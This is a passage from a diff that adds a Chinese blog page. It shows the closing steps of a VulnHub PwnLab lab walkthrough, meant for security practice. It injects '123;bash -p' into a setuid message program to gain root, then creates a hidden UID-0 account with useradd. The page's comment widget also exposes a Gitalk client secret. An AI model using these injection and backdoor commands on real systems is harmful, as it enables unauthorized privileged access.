+<p>4.有点不太一样，%s 是一种格式化字符串的占位符，表示将一个字符串插入到指定的位置。当我们输入一串字符串时，则会赋值给%s ，并将消息存储到&#x2F;root&#x2F;messages.txt文件下。那我们可以尝试利用该文件构造一个拼接命令，让他来执行我们需要的命令。可以用‘;’<br>5.执行msg2root  输入123;bash -p<br>6.添加root账号  useradd -m -u 0 -g 0 -o -s &#x2F;bin&#x2F;bash root1</p>
+<pre><code>
+![image-20241123173325088](/vulnhub-18pwnlab-init/image-20241123173325088.png)
+
+![image-20241123174009001](/vulnhub-18pwnlab-init/image-20241123174009001.png)
+</code></pre>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        <a href="../tags/PWN/"># PWN</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="../ctf-%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/">CTF-强网杯2019随便注</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d | Powered by <a href="https://hexo.io" target="_blank">one</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">two</a>
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+              
+              2022 - 2024
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
